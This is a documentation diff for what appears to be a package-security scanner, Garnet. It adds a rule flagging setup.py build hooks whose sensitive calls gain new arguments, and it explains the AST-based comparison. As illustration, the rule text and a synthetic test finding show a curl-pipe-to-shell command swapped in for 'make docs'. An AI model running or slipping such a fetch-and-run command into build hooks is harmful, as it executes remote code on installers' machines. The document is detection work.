@@ -21,6 +21,10 @@ Any of these, compared with the trusted version:
 - a new or changed `setup.py` adds a call in the [sensitive call set](#sensitive-call-set),
   anywhere in the file: `setup.py` runs as a script when the sdist is built, and a
   `cmdclass` hook in it runs at install, so a call inside a function or a method counts;
+- a sensitive call that the trusted `setup.py` already made now has arguments the trusted
+  one never passed to that name: `subprocess.call(['make', 'docs'])` becoming
+  `subprocess.call(['sh', '-c', 'curl … | sh'])` ([how arguments are
+  compared](#how-arguments-are-compared));
 - the build backend changed to one that is not on the allowlist, or to an in-tree backend;
 - the trusted version shipped no sdist at all, and the new sdist has either of the above:
   a release that had no build code has gained some;
@@ -37,6 +41,36 @@ Build backends on the allowlist: `setuptools.build_meta`, `setuptools.build_meta
 `hatchling.build`, `flit_core.buildapi`, `poetry.core.masonry.api`, `poetry_core.masonry.api`,
 `pdm.backend`, `pdm.pep517.api`, `maturin`, `scikit_build_core.build`, `mesonpy`, `uv_build`,
 `pbr.build`, `whey`, `sipbuild.api`, `enscons.api`.
+
+## How arguments are compared
+
+Garnet reads the arguments with `ast` and evaluates nothing. For each name in the sensitive
+set, the trusted `setup.py`'s calls to it and the new one's are compared as two lists of
+argument trees, counted with repeats:
+
+- Two calls have the same arguments when their syntax trees match with line numbers,
+  formatting, comments, quote style and a `u` string prefix left out, and with keyword
+  arguments in name order: Python binds keywords by name, so `cwd='docs', shell=False` and
+  `shell=False, cwd='docs'` pass the same thing. `**` arguments come after the keywords, in
+  their own order.
+- Any other difference counts: `['make', 'docs']` against `('make', 'docs')`, a different
+  string, a different variable name or another expression.
+- A call that moved to another line or another function, with the same arguments, matches
+  the trusted call. Each trusted call matches one new call, so a second copy of a trusted
+  call is reported ("once more than 1.0 did"), even on the same line as the first, and a
+  call that was removed isn't.
+- A changed call is shown beside a trusted call to the same name that nothing matched, in
+  line order, with both argument lists. A long shared beginning is cut to its last 20
+  characters so the place they differ stays on the line.
+
+A variable is compared by its name, not by what was assigned to it: when `subprocess.call(cmd)`
+stays the same and only `cmd = [...]` changes, the call isn't reported. The call's arguments
+are compared in full however long or deeply nested they are; the evidence shows up to
+1,000 characters of them. An argument list of more than 2,000 syntax nodes is shown as its
+source text, with whitespace collapsed, rather than rebuilt from the tree. If Garnet couldn't
+record a trusted call's arguments, the finding says so ("Garnet couldn't compare its
+arguments with 1.0's, so they may have changed") instead of treating the call as unchanged.
+A finding lists up to 25 lines and counts the rest ("and 5 more").
 
 ## Why it matters
 
@@ -75,9 +109,20 @@ memoryos 2.0.33 → 2.0.34: WARN
            - build backend poetry.core.masonry.api → in-tree:sckit_poetry_build
 ```
 
+A trusted call given a different command, from the test suite (a synthetic release; no
+replayed incident used this shape):
+
+```text
+demo 1.0 → 1.1: WARN
+  WARN  GRN-C002 new-build-hook: 1.1 changes code that runs when the sdist is built
+           - setup.py:9 calls subprocess.call(['sh', '-c', 'curl https://example.invalid/x | sh']) (in BuildDocs.run()), changed from subprocess.call(['make', 'docs']) at line 7 in 1.0
+```
+
 ## How to resolve it
 
-1. Read the `setup.py` diff or the new backend named in the evidence. For npm, read the
+1. Read the `setup.py` diff or the new backend named in the evidence. For changed
+   arguments, compare the two calls the evidence shows, and where an argument is a variable,
+   read what it holds in each release. For npm, read the
    script and the file it runs in the new tarball (`npm pack <name>@<version>` downloads it
    without installing).
 2. Prefer installing a wheel if the release has one for your platform: wheels don't run
